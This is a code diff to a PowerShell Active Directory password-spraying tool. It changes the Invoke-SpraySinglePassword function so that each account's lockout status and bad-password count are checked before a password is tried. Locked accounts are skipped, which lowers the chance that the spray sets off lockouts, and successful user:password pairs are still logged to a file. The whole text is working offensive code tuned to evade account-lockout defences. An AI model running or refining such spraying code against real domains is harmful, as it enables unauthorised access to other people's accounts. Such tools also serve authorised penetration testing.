@@ -503,8 +503,6 @@ function Get-DomainUserList
     return $UserListArray
 }
 
-
-
 function Invoke-SpraySinglePassword
 {
     param(
@@ -548,8 +546,16 @@ function Invoke-SpraySinglePassword
 
     foreach ($User in $UserListArray)
     {
+        # Check if user is locked out
+        $userStatus = Get-ADUser -Identity $User -Properties BadPwdCount, LockedOut
+        if ($userStatus.LockedOut -eq $true)
+        {
+            Write-Host -ForegroundColor Red "[*] Skipping user $User because they are locked out."
+            continue
+        }
+
         # Check BadPwdCount
-        $badPwdCount = (Get-ADUser -Identity $User -Properties BadPwdCount).BadPwdCount
+        $badPwdCount = $userStatus.BadPwdCount
         if ($badPwdCount -ge $lockoutThreshold-1)
         {
             Write-Host -ForegroundColor Red "[*] Skipping user $User due to $badPwdCount bad password attempts (threshold: $lockoutThreshold)."
@@ -568,13 +574,6 @@ function Invoke-SpraySinglePassword
                 Add-Content $OutFile $User`:$Password
             }
             Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
-        }
-        
-        # Check if user is locked out
-        $userLockoutStatus = (Get-ADUser -Identity $User -Properties LockedOut).LockedOut
-        if ($userLockoutStatus -eq $true)
-        {
-            Write-Host -ForegroundColor Red "[*] User $User is locked out!"
         }
 
         $curr_user += 1
